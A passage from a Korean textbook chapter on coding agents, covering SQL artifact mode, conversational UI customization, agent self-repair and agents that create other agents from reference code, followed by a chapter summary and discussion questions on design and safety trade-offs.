> **인수 기준**: 사용자가 "베이징 가는 비행기표를 예약하고 싶어"라고 입력하면, Agent가 다음을 포함한 폼을 생성: 출발 도시(텍스트 입력), 출발 날짜(날짜 선택기), 여행 유형(단일 선택: 편도/왕복), 귀국 날짜(“왕복” 선택 시에만 표시). 사용자가 한 번에 모든 정보를 제출해 완료.
>

**SQL 쿼리 생성.**

데이터베이스 쿼리는 코드 생성이 상호작용 경험을 크게 향상시킬 수 있는 시나리오입니다. 전통적인 데이터베이스 접근은 GUI 도구나 손으로 작성한 SQL에 의존하는데, 전자는 조작이 번거롭고 후자는 사용자에게 전문 지식을 요구합니다. Agent는 자연어를 SQL로 전환할 수 있지만, 여기에는 핵심적인 설계 선택이 하나 있습니다: Agent가 SQL을 실행한 뒤 자연어로 결과를 서술하게 할 것인가, 아니면 Agent가 SQL 코드를 artifact로 생성해 프런트엔드가 직접 실행하게 할 것인가?

첫 번째 방안은 더 "지능적으로" 보이지만 효율이 극히 낮습니다——쿼리 결과가 수천 줄의 대형 표를 포함할 수 있는데, LLM이 이를 읽고 텍스트로 서술하게 하면 대량의 토큰과 시간을 소모할 뿐 아니라, 더 심각하게는 LLM이 데이터를 "베껴 쓸" 때 매우 오류가 나기 쉽습니다. 더 나은 방안은 **artifact 모드**입니다. 그림5-9는 SQL 쿼리 Agent의 작업 흐름을 보여줍니다: Agent는 스스로 데이터를 읽지 않고, SQL 쿼리 코드 한 조각을 생성해 이를 독립적인 "산출물"(artifact)로 시스템에 넘깁니다. 시스템은 이 SQL을 들고 데이터베이스에 직접 쿼리해, 조회된 데이터를 사용자가 볼 수 있는 표로 렌더링합니다. 전체 과정에서 데이터는 데이터베이스에서 사용자 인터페이스로 곧장 이동해, LLM이라는 "중간자"를 완전히 우회합니다——LLM은 쿼리문 작성만 책임지지, 수만 줄의 데이터를 직접 읽고 사용자에게 복술할 필요가 없어 빠르고 정확합니다.

![그림5-9 SQL 쿼리 Agent 흐름](images/fig5-9.svg)


더 나아가, Agent는 두 개의 artifact를 생성해 파이프라인을 이룰 수도 있습니다: SQL 쿼리 + 시각화 코드(예: 막대그래프). 프런트엔드가 SQL 결과를 시각화 코드에 직접 전달하고, LLM은 코드 생성만 책임지지 데이터 전달에는 관여하지 않습니다——이것이 바로 인터페이스로서의 코드 생성의 정수입니다.

> **실험 5-10 ★★: 자연어 상호작용 ERP Agent**
>
> ERP(전사적 자원 관리) 소프트웨어는 기업의 핵심 시스템으로, 현재 일반적으로 GUI 인터페이스를 사용하며 복잡한 조작은 여러 번의 마우스 클릭이 필요합니다. AI Agent는 사용자의 자연어 질의를 SQL문으로 전환해 자동화된 조회를 구현할 수 있습니다.
>
> PostgreSQL 데이터베이스를 구축하고, 두 개의 표를 포함하도록 요구합니다: (1) 직원 표, 직원 ID, 이름, 부서, 등급, 입사일, 퇴사일(공란은 재직 중을 의미)을 포함; (2) 급여 표, 직원 ID, 지급일, 급여(매월 한 건씩 기록)를 포함. Agent가 자동으로 다음에 답합니다:
>
> 1. 직원당 평균 재직 기간은?
> 2. 부서별 재직 직원 수는?
> 3. 어느 부서의 직원 평균 등급이 가장 높은가?
> 4. 부서별로 올해와 작년에 각각 몇 명이 신규 입사했는가?
> 5. 재작년 3월부터 작년 5월까지, A 부서의 평균 급여는?
> 6. 작년 A 부서와 B 부서 중 평균 급여가 더 높은 곳은?
> 7. 올해 등급별 직원 평균 급여는?
> 8. 입사 1년 이내, 1~2년, 2~3년인 직원의 최근 한 달 평균 급여는?
> 9. 작년에서 올해로 급여 인상 폭이 가장 큰 상위 10명은?
> 10. 체불된 급여가 있는가(어느 달에 재직 중이었으나 급여가 지급되지 않은 경우)?
>

**동적 소프트웨어 생성.**

코드 생성 능력의 궁극적인 응용은 Agent가 완전히 동적으로, 처음부터 소프트웨어를 창조하게 하는 것입니다. Anthropic의 "Imagine with Claude"는 이런 가능성의 경계를 보여줍니다: 사용자가 요구를 제시하면 Claude가 실시간으로 프런트엔드 인터페이스와 상호작용 로직을 생성하고, 사용자가 생성된 소프트웨어와 상호작용하면 Claude가 코드를 수정해 새 인터페이스를 생성해 조작 결과를 보여줍니다. 전체 과정에서 사용자는 무에서 유로, 지속적으로 진화하는 애플리케이션 프로그램을 봅니다.

다만 이런 완전 동적 생성 모드는 비용과 지연이 상대적으로 높아, 능력의 경계를 보여주는 실험에 더 적합합니다. 더 실용적인 방향은 **기존 프레임워크를 기반으로 한 커스텀 수정**입니다. 이런 "반(半) 맞춤" 모드는 기본 소프트웨어의 안정성을 유지하면서, 특정 차원에서 사용자 통제권을 개방합니다——사용자가 "버튼을 파란색으로 바꿔줘", "사이드바에 단축 메뉴를 추가해줘", "폰트를 더 읽기 쉬운 스타일로 바꿔줘"라고 말하면, Agent가 요구를 이해해 프런트엔드 코드를 수정하고, 핫 로드(HMR, Hot Module Replacement, 국소적 핫 교체, 애플리케이션 상태를 유지한 채 전체 페이지 새로고침 없이 적용)로 즉시 반영합니다. 이는 "일률적인" 표준 제품을 "천인천색"의 개인화된 경험으로 바꿉니다.

> **실험 5-11 ★★: 대화형 인터페이스 커스터마이징 시스템**
>
> **실험 목표**: 사용자가 자연어 대화를 통해 즉시 소프트웨어 인터페이스를 커스터마이징하는 능력을 구현하고, 핫 로드 메커니즘이 뒷받침하는 코드 생성이 개인화된 사용자 경험을 제공하는 데 얼마나 유효한지 검증.
>
> **기술 방안**: 기본 챗봇 애플리케이션(React 프런트엔드 + FastAPI 백엔드) 구축, 프런트엔드와 백엔드 모두 개발 모드에서 핫 로드를 지원(React의 HMR, FastAPI의 reload). 사용자가 대화 중 UI 커스터마이징 요구(색상, 폰트, 레이아웃, 컴포넌트 위치 등)를 제시하면 Agent가 자율적으로 코드를 수정. 핫 로드 메커니즘이 파일 변경을 자동 감지해 프런트엔드를 재컴파일하고 새로고침해, 사용자가 실시간으로 인터페이스 변화를 확인. 여러 라운드에 걸친 반복 커스터마이징 지원.
>

### 코드가 코드를 창조: Agent 자기 부트스트래핑

앞 절들은 코드 생성이 수학적 사고부터 문서 창작, 인터페이스 커스터마이징까지 다양한 영역에서 응용되는 모습을 보여줬습니다. 이런 능력들을 극한까지 밀어붙이면, 자연스러운 질문 하나가 떠오릅니다: Agent가 코드 생성 능력을 이용해 또 다른 Agent를 창조할 수 있을까요?

여기서 먼저 제8장과의 역할 분담을 명확히 해야 합니다. 이 절이 다루는 것은 Agent가 코드로 **자신과 같은 종류의 Agent를 수리하고 창조**하는 것——자기 수리, 자기 복제, 필요에 따라 새 Agent를 번식——이며, 작용 대상은 Agent의 코드와 구조입니다. 제8장의 "자기 진화"는 또 다른 일로, Agent가 **모델 가중치를 바꾸지 않는** 전제 하에 능력을 지속적으로 키워가는 것(경험 축적, 프롬프트 최적화, 도구 축적)을 가리키며, 작용 대상은 Agent의 지식과 전략입니다. 둘 다 "진화"라 부를 수 있지만, 제8장의 장 제목과 혼동되지 않도록 이 절에서는 "코드로 Agent를 생산하는" 이 능력을 **자기 부트스트래핑**(bootstrapping)이라고 부르겠습니다.


![그림5-10 Agent 자기 부트스트래핑 루프](images/fig5-10.svg)


**Agent의 자기 수리: OpenClaw Doctor.**

Agent 자기 부트스트래핑의 중요한 전제는 자기 수리 능력입니다. OpenClaw의 `doctor` 명령이 바로 이런 능력을 구현합니다——세 종류의 문제를 자동으로 탐지할 수 있습니다:

- **설정 이상**: 만료된 OAuth 토큰, 낡은 설정 형식, 포트 충돌
- **상태 문제**: 오래된 세션 락 파일, 플러그인 의존성 누락
- **서비스 건강 문제**: 게이트웨이 미실행, 샌드박스 이미지 누락

그리고 계층적 수리 전략으로 자동 해결합니다: 안전한 수리(설정 정규화, 락 파일 정리)는 자동 실행되고, 위험이 있는 조작(서비스 재시작, 강제 설정 덮어쓰기)은 사용자 확인이 필요합니다.

여기서 과장을 하나 피해야 합니다: 만료된 토큰, 락 파일, 포트 충돌 같은 고빈도 문제는 그 자체로 명확한 탐지 규칙과 고정된 수리 동작이 있으므로, `doctor`는 **일련의 결정론적 검사를 기반으로** 우선 이들을 처리합니다——이는 전통적인 운영 스크립트와 본질적 차이가 없습니다. Agent 능력이 진짜로 드러나는 곳은 두 번째 층입니다: 결정론적 규칙이 커버하지 못하는 까다로운 문제에 대해, `doctor`는 이를 LLM에게 넘겨 오류 로그를 분석하고, 설정 파일의 의미를 이해하고, 문제의 인과 관계를 추론해 맞춤형 수리 방안을 생성하게 합니다. 결정론적 검사는 흔한 문제가 안정적으로 수리됨을 보장하고, LLM은 롱테일 난제를 마지막까지 보완합니다——두 층이 함께 작동해야 `doctor --fix`가 상당수의 흔한 게이트웨이 문제를 자동 해결할 수 있습니다. 이런 "Agent가 Agent를 수리하는" 패턴은, Agent의 작업 대상이 더 이상 외부 시스템이 아니라 자기 자신의 실행 환경일 때, 자기 수리 능력이 시스템 어댑터에서 Agent 자기 부트스트래핑의 기반 시설로 격상됨을 보여줍니다.

**Agent에게 Agent를 작성하게 하는 핵심 기법.**

고품질 Agent를 창조하는 것은 평범한 애플리케이션 코드를 생성하는 것보다 훨씬 복잡합니다. Agent 아키텍처 패턴, 모범 사례, 흔한 함정에 대한 깊은 이해가 필요하기 때문입니다. 이런 도메인 전문 지식이 부족하면, 아무리 강력한 코드 생성 모델이라도 아키텍처상 심각한 결함이 있는 Agent를 만들어낼 수 있습니다. 흔한 결함은 다음을 포함합니다:

1. **컨텍스트 관리의 임의성**: 제2장에서 논의한 표준 컨텍스트 형식을 채택하지 않고, 궤적을 순수 텍스트로 변환해 컨텍스트에 밀어넣어 구조화된 메시지가 가져다주는 KV 캐시 최적화를 무시하며, 도구 호출 루프에 경계 버그가 존재
2. **도구 설계의 비규범성**: 서술이 간략하고, 사용 경계 설명과 부정 목록이 없으며, 매개변수에 구체적 예시가 없음
3. **기술 선택의 지체성**: 훈련 데이터 속에서 가장 흔하지만 이미 낡은 모델과 API를 사용하는 경향. 해결책: SOTA 지식 베이스를 유지하거나 Agent에게 검색 능력을 부여
4. **외부 생태계와의 단절**: 폐기된 API, 더 이상 유지보수되지 않는 라이브러리, 결함 있는 패턴을 사용

이런 문제를 해결하는 가장 효과적인 경로는, 프롬프트에 모든 규칙을 빠짐없이 담는 것이 아니라 **고품질 Agent 구현을 참고 사례로 제공**해, 코드 생성 Agent가 이를 기반으로 수정하도록 유도하는 것이지, 처음부터 새로 작성하게 하는 것이 아닙니다.

"사례 기반 생성"의 장점은 뚜렷합니다: 사례 코드 자체가 모범 사례의 담체이므로, Agent가 사례를 고치는 것이 처음부터 쓰는 것보다 더 쉽게 옳은 답을 냅니다. 아키텍처상의 좋은 선택은 자연스럽게 보존되며, 프롬프트에 모든 규칙을 일일이 적을 필요가 없습니다.

Agent가 새 Agent를 개발하는 임무를 받으면, 먼저 자기 자신의 코드(또는 검증된 다른 고품질 구현)를 복제한 뒤, 목적에 맞게 수정해야 합니다: 시스템 프롬프트를 조정해 새 역할에 맞추고, 도구를 교체하거나 증감해 새 기능에 적응시키며, 비즈니스 로직은 수정하되 아키텍처 골격은 유지합니다. 이런 "자기 복제 후 적응적 수정" 패턴은 새 Agent가 핵심 기술적 우위를 계승하면서도, 특정 차원에서 차별화되도록 허용합니다——생물학에서 유전자가 복제되며 변이가 생기는 것과 같습니다.

> **실험 5-12 ★★★: Agent를 창조할 수 있는 Agent 개발**
>
> **실험 목표**: 메타프로그래밍(Metaprogramming, 즉 다른 프로그램을 생성하거나 수정하는 프로그램을 작성하는 것) 능력을 갖춘 Coding Agent를 구축해, 사용자 요구에 따라 새 Agent 시스템을 자동으로 창조하되 모범 사례를 준수하도록 보장.
>
> **기술 방안**: Coding Agent에게 참고 사례로 고품질 Agent 구현을 제공(ch5/coding-agent 프로젝트 자체를 사용 가능). 새 Agent 창조 요구를 받으면, Agent는 먼저 이 사례 코드를 복제한 뒤 사용자의 구체적 요구에 맞춰 목적에 맞게 수정.
>
> **인수 기준**: 생성된 Agent가 성공적으로 실행되고 기본 작업을 완수할 수 있어야 함. 표준 메시지 형식과 도구 호출 프로토콜을 채택했는지 검증. 현재 권장되는 모델과 API를 사용하는지 검증. 다중 라운드 대화에서 컨텍스트와 상태 관리의 정확성을 테스트. 처음부터 생성한 경우와 사례 기반 수정 두 모드를 비교해, 후자가 품질과 효율에서 갖는 우위를 검증.

Agent 자기 부트스트래핑은 코드 생성 능력의 궁극적 응용을 구현합니다——Agent를 창조할 수 있는 Agent는 지능의 자기 번식을 실현합니다. 이상으로 Coding Agent의 기초에서 코드 생성의 다원적 가치, 그리고 자기 부트스트래핑에 이르는 완전한 흐름을 정리했습니다.

## 이 장 요약

이 장에서 논의한 핵심은 시종일관 하나입니다: 코드는 단순히 프로그램을 작성하는 도구가 아니라, Agent가 형식적으로 사고하고 정밀하게 표현하는 언어입니다.

Harness 엔지니어링 절의 핵심 결론은 다음과 같습니다: Coding Agent의 성숙도가 높은 이유는 코드 생성 모델이 특별히 강해서가 아니라, 소프트웨어 공학이 수십 년간 쌓아온 기반 시설——테스트 스위트, 타입 시스템, 버전 관리——이 본래 강력한 Harness를 자연스럽게 구성하기 때문입니다. 이 결론은 다른 Agent 시나리오로도 확장할 가치가 있습니다. 장애와 오류 복구 절은 같은 주제의 또 다른 면을 제시했습니다: Agent의 신뢰성은 모델이 오류를 저지르느냐가 아니라, 모든 유형의 장애에 대응하는 탐지, 복구, 종료 경로가 갖춰져 있느냐에 달려 있습니다.

두 번째 부분은 코드 생성이 프로그래밍을 넘어 가지는 폭넓은 가치를, 본문의 여섯 차원에 대응해 보여줬습니다:

- **사고 도구**: 기호 계산과 제약 풀이를 빌려 확률적 사고의 부족함을 보완
- **비즈니스 규칙 제약**: 모호함 없는 방식으로 비즈니스 규칙을 표현해, 되돌릴 수 없는 조작 시나리오에서 확정적인 안전 방어선을 제공——이 안전 보장의 가치는 구현 비용을 훨씬 능가
- **멀티미디어 생성**: 제안자-검토자 메커니즘을 통해 PPT, 영상 등 멀티모달 콘텐츠를 창조
- **시스템 어댑터**: 형식 진화를 자동으로 따라가 로그 파싱과 문제 진단의 완전 자동화를 구현
- **생성형 UI**: 폼, 시각화 차트, 심지어 완전히 커스텀 가능한 애플리케이션을 동적으로 창조해 순수 텍스트의 한계를 돌파
- **Agent 자기 부트스트래핑**: 코드로 같은 종류의 Agent를 수리하고 창조해, Agent를 창조할 수 있는 Agent를 구현

코드가 Agent에게 주는 가치는 이렇습니다: 작업을 완수하는 수단이면서, 동시에 지식을 축적하고, 도구를 창조하고, 자신을 최적화하는 메커니즘이기도 합니다——진정한 "메타 능력"입니다.

여기까지, 우리는 세 기둥 중 컨텍스트와 도구라는 두 기둥의 논의를 마쳤습니다——코드 생성은 그중에서도 범용성이 가장 강한 도구입니다. 하지만 핵심 질문 하나가 아직 남아 있습니다: 이런 설계 결정들의 효과를 어떻게 과학적으로 측정할 것인가? 다음 장부터 우리는 세 번째 기둥——모델——로 들어가며, 먼저 평가에서 시작합니다. 다음 장은 완전한 평가 방법론——평가 환경 구축, 데이터셋 설계부터 보상 모델과 평가 주도의 모델 선정까지——을 구축해, 앞선 모든 장에서 논의한 기술 방안에 정량적 검증 수단을 제공합니다.

## 생각해볼 문제

1. ★★ 코드 생성은 Agent의 "메타 능력"이라 불립니다. 하지만 코드 실행은 보안 위험을 수반합니다——Agent가 생성한 코드에 취약점, 무한 루프, 자원 고갈이 포함될 수 있습니다. 샌드박스 격리가 일부 문제를 해결할 수 있지만 코드 능력도 함께 제한합니다(예: 네트워크나 파일 시스템에 접근할 수 없음). 안전성과 능력 사이에서 어떻게 최적의 균형점을 찾을 수 있을까요?
2. ★★★ Agent 자기 부트스트래핑——Agent를 창조할 수 있는 Agent——은 "지능의 자기 번식"을 실현합니다. 하지만 매번의 부트스트래핑은 새로운 편향이나 오류를 도입할 수 있는데, 이런 오류는 세대를 거치며 누적될까요? Agent 자기 부트스트래핑의 퇴화를 어떻게 막을 수 있을까요?
3. ★★ 로그 파싱을 처리할 때 코드 생성 Agent는 형식 진화를 자동으로 따라갈 수 있습니다. 하지만 형식 변화가 의도된 변경이 아니라 버그라면, Agent의 적응성이 오히려 문제를 은폐할 수 있습니다. Agent는 "적응해야 할 변화"와 "보고해야 할 이상"을 어떻게 구분해야 할까요?
4. ★★ 이 장은 PPT 생성, 영상 편집, 로그 시각화에서 제안자-검토자 메커니즘을 반복적으로 사용했습니다. 만약 Reviewer의 미적 선호가 목표 사용자와 어긋난다면——예를 들어 Reviewer는 정보 밀도가 합리적이라 여기지만 사용자는 너무 빽빽하다고 느낀다면——피드백 루프는 잘못된 국소 최적점으로 수렴할 것입니다. 사용자의 선호 피드백도 Reviewer 루프에 참여시키려면 어떻게 해야 할까요?
5. ★★ 이 장은 Coding Agent가 실행과 디버깅에서 얻은 경험을 코드베이스로 되돌려 정착시키는 다양한 방식——지식 베이스 파일에 쓰기, 아키텍처 문서 갱신, 프로젝트 명령 파일 유지, 조작 시퀀스를 코드로 고정——을 보여줬습니다. 이런 경험을 더 나아가 시스템 프롬프트의 규칙으로 정제한다면, 규칙 집합은 시간이 지나며 계속 팽창할 것입니다. 정착된 규칙에 대해 "가비지 컬렉션"——중복되거나 낡은 항목을 식별해 정리하는 것——을 어떻게 할 수 있을까요? Agent가 스스로 경험을 정착시키는 이 메커니즘은 제8장에서 논의할 시스템 프롬프트 자동 최적화와 어떤 공통점과 차이점이 있을까요?
6. ★ "원격 근무에 친화적인 팀은 대개 AI Agent에도 친화적입니다." 여러분이 속한 팀이나 조직은 지식 문서화 면에서 "AI-ready"까지 얼마나 남았나요? 가장 큰 장애물은 무엇인가요?
7. ★★★ Simon Willison은 Agent의 "치명적 세 요소"(개인 데이터 접근, 신뢰할 수 없는 콘텐츠에 노출, 외부 통신 능력 보유)를 제시했으며, 이 장은 이를 바탕으로 네 번째——지속적 기억——를 추가했습니다. 이 네 요소를 동시에 처리해야 하는 프로덕션 환경에서 여러분이라면 어떻게 보안 정책을 설계하시겠습니까?
8. ★★ Artifact 모드는 Agent가 생성한 SQL이나 프런트엔드 코드가 사용자 브라우저나 데이터베이스에서 직접 실행되게 합니다. 하지만 생성된 SQL이 파괴적 조작을 실행할 수 있고, 생성된 HTML에 취약점이 포함될 수 있습니다. 시스템의 안전성을 어떻게 보장할 수 있을까요?
9. ★★ 비즈니스 규칙을 도구 내부의 데이터베이스 진리값 기반 검증으로 코드화하고, 매개변수 설계로 모델이 호출 전에 정책 조건을 확인하도록 유도하는 것은 본질적으로 코드 구조로 Agent 행동을 제약하는 것입니다. 이런 "코드가 곧 규칙"인 패턴은 자연어 규칙에 비해 어떤 장점과 한계가 있을까요?
10. ★★ Artifact 모드는 Agent가 생성한 SQL이나 시각화 코드를 프런트엔드가 직접 실행하게 함으로써 LLM이 대량의 데이터를 처리하는 것을 우회합니다. 이런 "Agent가 코드를 생성하고 시스템이 코드를 실행하는" 분업 모드는 전통적인 "Agent가 직접 답을 내놓는" 모드에 비해 어떤 장단점이 있을까요?
